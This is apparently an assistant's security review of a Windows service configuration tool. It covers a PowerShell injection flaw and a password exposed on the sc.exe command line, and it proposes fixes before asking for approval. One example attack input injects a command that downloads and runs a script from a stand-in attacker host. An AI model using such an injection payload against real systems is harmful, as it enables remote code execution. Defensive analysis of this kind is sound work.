# Critical Security Issues - Detailed Analysis

**Before we fix anything, we need to understand what the code is trying to accomplish**

---

## CRITICAL-1: PowerShell Script Injection in GrantLogonAsServiceRightAsync

### Location
`src/ZLFileRelay.ConfigTool/Services/ServiceAccountManager.cs`, lines 132-226

### What It's Trying To Do

**Business Requirement:**  
Grant the "Log on as a service" Windows privilege (SeServiceLogonRight) to a user account so they can run the ZLFileRelay Windows Service.

**Technical Process:**
1. Accept a username (format: `DOMAIN\username` or `username`)
2. Convert username to a Windows Security Identifier (SID)
3. Export current Windows security policy using `secedit.exe`
4. Read the current list of accounts with SeServiceLogonRight
5. Add the user's SID to the list if not already present
6. Create a new security policy configuration file
7. Apply the updated policy using `secedit.exe`
8. Clean up temporary files

**Execution Context:**
- Can run **locally** (on the same machine as ConfigTool)
- Can run **remotely** via PowerShell Remoting (on a different server)
- Uses `PowerShellRemotingService.ExecuteScriptAsync()` method

### Current Implementation

```csharp
public async Task<bool> GrantLogonAsServiceRightAsync(string username)
{
    // A 65-line PowerShell script stored as a C# string
    var psScript = $@"
param($UserName)                         // <-- Declares parameter

$ntprincipal = new-object System.Security.Principal.NTAccount $UserName
$sid = $ntprincipal.Translate([System.Security.Principal.SecurityIdentifier])
# ... rest of script uses $UserName variable ...
";

    // THE PROBLEM: String replacement happens BEFORE sending to PowerShell
    var result = await _psRemoting.ExecuteScriptAsync(
        psScript.Replace("$UserName", $"'{username}'"));  // <-- VULNERABLE!
    
    return result.Success;
}
```

### The Vulnerability Explained

**What the developer intended:**
- Pass the username as a PowerShell parameter safely
- The script has `param($UserName)` at the top

**What actually happens:**
1. The entire PowerShell script is stored as a C# string
2. `.Replace("$UserName", $"'{username}'")` does a **text substitution**
3. All occurrences of the literal string `$UserName` are replaced with the actual username wrapped in quotes
4. The modified script is sent to PowerShell as raw text
5. PowerShell executes it as-is

**Why this is vulnerable:**

If a username contains PowerShell syntax, it gets executed:

**Example Attack:**
```csharp
// Attacker provides this username:
string username = "test'; Invoke-WebRequest http://evil.com/backdoor.ps1 | iex; #";

// After replacement, the script becomes:
param('test'; Invoke-WebRequest http://evil.com/backdoor.ps1 | iex; #')  // <-- Syntax error but too late
$ntprincipal = new-object System.Security.Principal.NTAccount 'test'; Invoke-WebRequest http://evil.com/backdoor.ps1 | iex; #'
```

The attacker's code executes with the privileges of the ConfigTool (Administrator).

### Available Tools We Have

Looking at `PowerShellRemotingService.cs`, we have **two methods**:

**Method 1: ExecuteScriptAsync** (currently used - UNSAFE)
```csharp
public async Task<PowerShellResult> ExecuteScriptAsync(string script, string? serverName = null)
```
- Takes a raw PowerShell script as a string
- No parameter support
- Executes the script exactly as provided
- ❌ Vulnerable to injection if script contains user input

**Method 2: ExecuteCommandAsync** (not currently used - SAFE)
```csharp
public async Task<PowerShellResult> ExecuteCommandAsync(
    string command, 
    Dictionary<string, object>? parameters = null, 
    string? serverName = null)
```
- Takes a PowerShell command/cmdlet name
- Accepts parameters as a Dictionary
- Uses PowerShell's `.AddParameter()` method
- ✅ Safe from injection (parameters are properly escaped)

### The Fix Strategy

We have **three possible approaches**:

#### Option 1: Switch to ExecuteCommandAsync with proper parameters (BEST)

**Pros:**
- Uses built-in PowerShell parameter handling (safe)
- Clean separation of code and data
- Most secure approach

**Cons:**
- Requires rewriting the 65-line script as a PowerShell function or cmdlet
- More complex refactoring

**Implementation approach:**
```csharp
// Save the PowerShell script as a function, then invoke it with parameters
var psScript = @"
function Grant-ServiceLogonRight {
    param(
        [Parameter(Mandatory=$true)]
        [string]$UserName
    )
    # ... existing script logic ...
}
";

// First, load the function
await _psRemoting.ExecuteScriptAsync(psScript);

// Then, invoke it with safe parameters
var parameters = new Dictionary<string, object>
{
    { "UserName", username }
};
var result = await _psRemoting.ExecuteCommandAsync("Grant-ServiceLogonRight", parameters);
```

#### Option 2: Proper escaping before string replacement (MEDIUM)

**Pros:**
- Minimal code changes
- Works with existing ExecuteScriptAsync

**Cons:**
- Escaping must be perfect (easy to miss edge cases)
- Still using string manipulation (inherently risky)

**Implementation approach:**
```csharp
// Escape PowerShell special characters
var escapedUsername = username
    .Replace("'", "''")      // Single quotes
    .Replace("`", "``")      // Backticks
    .Replace("$", "`$")      // Dollar signs
    .Replace(";", "`;")      // Semicolons
    .Replace("&", "`&")      // Ampersands
    .Replace("|", "`|")      // Pipes
    .Replace("<", "`<")      // Less than
    .Replace(">", "`>")      // Greater than
    .Replace("(", "`(")      // Open paren
    .Replace(")", "`)");     // Close paren

var result = await _psRemoting.ExecuteScriptAsync(
    psScript.Replace("$UserName", $"'{escapedUsername}'"));
```

#### Option 3: Use a here-string with base64 encoding (PARANOID)

**Pros:**
- Completely avoids string escaping issues
- Username is treated as pure data

**Cons:**
- More complex
- Harder to debug

**Implementation approach:**
```csharp
var usernameBytes = System.Text.Encoding.Unicode.GetBytes(username);
var usernameBase64 = Convert.ToBase64String(usernameBytes);

var psScript = $@"
$encodedUsername = '{usernameBase64}'
$usernameBytes = [System.Convert]::FromBase64String($encodedUsername)
$UserName = [System.Text.Encoding]::Unicode.GetString($usernameBytes)

# Now use $UserName safely in the rest of the script
$ntprincipal = new-object System.Security.Principal.NTAccount $UserName
# ... rest of script ...
";

var result = await _psRemoting.ExecuteScriptAsync(psScript);
```

### Recommended Approach for CRITICAL-1

**Use Option 1 (ExecuteCommandAsync)** because:
1. Most secure (PowerShell handles parameter escaping)
2. Best practice for PowerShell remoting
3. More maintainable
4. Already have the infrastructure (`ExecuteCommandAsync` exists)

---

## CRITICAL-2: Password Exposure in Command Line (SetServiceAccountAsync)

### Location
`src/ZLFileRelay.ConfigTool/Services/ServiceAccountManager.cs`, lines 91-130

### What It's Trying To Do

**Business Requirement:**  
Change the account that the ZLFileRelay Windows Service runs under.

**Technical Process:**
1. Accept username and password for the service account
2. Use Windows `sc.exe` (Service Control) utility to reconfigure the service
3. Set the service's "Log On As" account to the specified username
4. Store the password so Windows can use it to start the service

**Execution Context:**
- Can run **locally**: `sc.exe config ZLFileRelay obj="DOMAIN\user" password="pass123"`
- Can run **remotely**: `sc.exe \\servername config ZLFileRelay obj="DOMAIN\user" password="pass123"`

### Current Implementation

```csharp
public async Task<bool> SetServiceAccountAsync(string username, string password)
{
    var scTarget = GetScTarget();  // Returns "" for local, or "\\servername " for remote
    
    var startInfo = new ProcessStartInfo
    {
        FileName = "sc.exe",
        Arguments = $"{scTarget}config {ServiceName} obj= \"{username}\" password= \"{password}\"",
        UseShellExecute = false,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        CreateNoWindow = true
    };

    using var process = Process.Start(startInfo);
    await process.WaitForExitAsync();
    
    return process.ExitCode == 0;
}
```

### The Vulnerability Explained

**Windows Process Command Line Exposure:**

When you start a process in Windows, the command-line arguments are visible to:
1. **Task Manager** (Details tab, "Command Line" column)
2. **Process Explorer** (Sysinternals tool)
3. **WMI/PowerShell**: `Get-CimInstance Win32_Process | Select CommandLine`
4. **Windows Event Logs** (Process Creation auditing)
5. **Crash dumps** (if the process crashes)
6. **Security monitoring tools** (EDR, SIEM)

**Real-world exposure:**

```powershell
# Any user can see all command lines:
PS> Get-CimInstance Win32_Process | Where-Object {$_.Name -eq "sc.exe"} | Select CommandLine

CommandLine
-----------
sc.exe config ZLFileRelay obj= "DOMAIN\svc_account" password= "SuperSecret123!"
```

The password sits there visible until the sc.exe process completes (usually < 1 second, but still exposed).

### Why They Did It This Way

**Constraints with sc.exe:**

`sc.exe` is the standard Windows utility for configuring services. Unfortunately:
- ❌ No way to read password from stdin
- ❌ No way to read password from a file
- ❌ No way to use encrypted passwords
- ✅ Only accepts password as a command-line argument

**Remote support requirement:**

The `\\servername` prefix allows managing services on remote machines without PowerShell Remoting:
```
sc.exe \\remote-server config ServiceName obj="user" password="pass"
```

However, we **already have PowerShell Remoting** available via `PowerShellRemotingService`!

### Available Alternatives

#### Alternative 1: WMI via PowerShell (BEST - Most Secure)

**Windows Management Instrumentation (WMI)** has a `Change()` method on the `Win32_Service` class that accepts credentials directly (not via command line).

**Pros:**
- Password never appears in command line
- Password passed as SecureString or direct parameter to PowerShell
- Works remotely via PowerShell Remoting (which we already have)
- Native Windows API

**Cons:**
- Slightly more complex than sc.exe
- Requires PowerShell

**Key difference:**
```powershell
# Bad - password visible in process list:
sc.exe config ServiceName obj="user" password="MyPassword"

# Good - password passed as object property, not command line:
$service = Get-WmiObject Win32_Service -Filter "Name='ServiceName'"
$result = $service.Change($null,$null,$null,$null,$null,$null,"user","MyPassword",$null,$null,$null)
```

#### Alternative 2: PowerShell Set-Service with SecureString (IDEAL)

**Pros:**
- Modern PowerShell cmdlet
- Designed for secure credential handling
- Supports SecureString and PSCredential objects
- Clean API

**Cons:**
- Requires PowerShell 5.0+ (available on Windows 10/Server 2016+)
- May have compatibility issues with older systems

```powershell
$securePassword = ConvertTo-SecureString "MyPassword" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", $securePassword)
Set-Service -Name "ServiceName" -Credential $cred
```

#### Alternative 3: COM/DirectoryServices API (COMPLEX)

**Pros:**
- No command line exposure
- Works without PowerShell

**Cons:**
- Much more complex code
- Requires COM interop
- Not worth the complexity

### The Fix Strategy for CRITICAL-2

**Recommended: Use WMI via PowerShell with SecureString**

Why this approach:
1. **No command-line exposure** - password passed as parameter object
2. **Already have PowerShell infrastructure** - can use `ExecuteScriptAsync`
3. **Works locally and remotely** - same code path for both
4. **Well-documented** - standard Windows approach

**Implementation:**

```csharp
public async Task<bool> SetServiceAccountAsync(string username, string password)
{
    // Create the PowerShell script
    var psScript = @"
param(
    [string]$ServiceName,
    [string]$Username,
    [securestring]$Password
)

# Convert SecureString to plain text for WMI (handled internally by .NET)
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
$plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

# Get the service
$service = Get-WmiObject Win32_Service -Filter ""Name='$ServiceName'""
if ($null -eq $service) {
    Write-Error ""Service not found: $ServiceName""
    exit 1
}

# Change service account
# Parameters: DisplayName, PathName, ServiceType, ErrorControl, StartMode, 
#             DesktopInteract, StartName, StartPassword, LoadOrderGroup, 
#             LoadOrderGroupDependencies, ServiceDependencies
$result = $service.Change($null, $null, $null, $null, $null, $null, $Username, $plainPassword, $null, $null, $null)

if ($result.ReturnValue -eq 0) {
    Write-Output ""Service account changed successfully""
    exit 0
} else {
    Write-Error ""Failed to change service account. Error code: $($result.ReturnValue)""
    exit 1
}
";

    // Convert password to SecureString
    var securePassword = new System.Security.SecureString();
    foreach (char c in password)
    {
        securePassword.AppendChar(c);
    }
    securePassword.MakeReadOnly();

    // Execute with parameters
    var parameters = new Dictionary<string, object>
    {
        { "ServiceName", ServiceName },
        { "Username", username },
        { "Password", securePassword }
    };

    var result = await _psRemoting.ExecuteCommandAsync(psScript, parameters);
    
    return result.Success;
}
```

**Why this is secure:**
1. Password converted to `SecureString` in C# (encrypted in memory)
2. Passed as a parameter object to PowerShell (not command line)
3. PowerShell receives it as a secure object
4. Only converted to plain text inside the PowerShell script (in memory)
5. No external process sees the password

---

## Summary of Intended Behavior

### CRITICAL-1: GrantLogonAsServiceRightAsync
- **Input:** Windows username (may include domain)
- **Output:** Boolean success/failure
- **Side Effect:** Grants SeServiceLogonRight Windows privilege
- **Remote Support:** Yes (via PowerShell Remoting)
- **Frequency:** Run once during service setup, or when changing service account

### CRITICAL-2: SetServiceAccountAsync
- **Input:** Windows username and password
- **Output:** Boolean success/failure
- **Side Effect:** Changes Windows Service "Log On As" account
- **Remote Support:** Yes (desired)
- **Frequency:** Run once during service setup, or when changing service account

### Usage Flow in ConfigTool

Based on `ServiceAccountViewModel.cs`:

1. Admin opens ConfigTool
2. Goes to Service Account configuration
3. Enters username and password for service account
4. Clicks "Set Service Account" button → calls `SetServiceAccountAsync`
5. Clicks "Grant Logon Right" button → calls `GrantLogonAsServiceRightAsync`
6. May also set folder permissions for the service account

**Current user experience:**
- Two separate buttons (can be run independently)
- Log messages show progress
- Can work on local or remote servers

**User experience must be preserved:**
- Same button workflow
- Same success/failure feedback
- Same local/remote capability
- Same error messages

---

## Fix Implementation Plan

### Phase 1: Fix CRITICAL-1 (PowerShell Injection)
1. ✅ Refactor `GrantLogonAsServiceRightAsync` to use `ExecuteCommandAsync`
2. ✅ Convert the PowerShell script to a function
3. ✅ Pass username as a parameter dictionary
4. ✅ Test with malicious usernames to verify fix
5. ✅ Test remote execution still works

### Phase 2: Fix CRITICAL-2 (Password Exposure)
1. ✅ Replace sc.exe with WMI-based PowerShell script
2. ✅ Use SecureString for password handling
3. ✅ Pass credentials via `ExecuteCommandAsync` parameters
4. ✅ Test with both local and domain accounts
5. ✅ Verify no password appears in process listings

### Phase 3: Testing
1. ✅ Unit tests for injection attempts
2. ✅ Integration tests for local service configuration
3. ✅ Integration tests for remote service configuration
4. ✅ Verify backward compatibility with existing workflows
5. ✅ Verify error handling still works

### Phase 4: Documentation
1. ✅ Update code comments
2. ✅ Document the security improvements
3. ✅ Update any relevant user documentation
4. ✅ Add security notes for future maintainers

---

## Questions to Resolve Before Implementing

1. **Do we need to maintain sc.exe as a fallback?**
   - Probably not - WMI is available on all supported Windows versions
   - If PowerShell fails, sc.exe would likely fail too

2. **Should we handle password in-memory time?**
   - Should we clear the password from memory after use?
   - Current ViewModel clears it after successful set (line 64)

3. **Do we need additional logging?**
   - Security audit log for service account changes?
   - Currently logs success/failure but not details

4. **Should we add validation?**
   - Validate username format before attempting to set?
   - Check if account exists before granting privileges?

5. **Error handling improvements?**
   - WMI returns numeric error codes - should we translate to friendly messages?
   - Current error handling just returns success/failure

---

## Next Steps

Once you approve this analysis, I'll proceed with:
1. Implement the fixes with the recommended approaches
2. Add comprehensive error handling
3. Add security logging
4. Create test cases to verify the fixes
5. Update documentation

**Ready to proceed?**
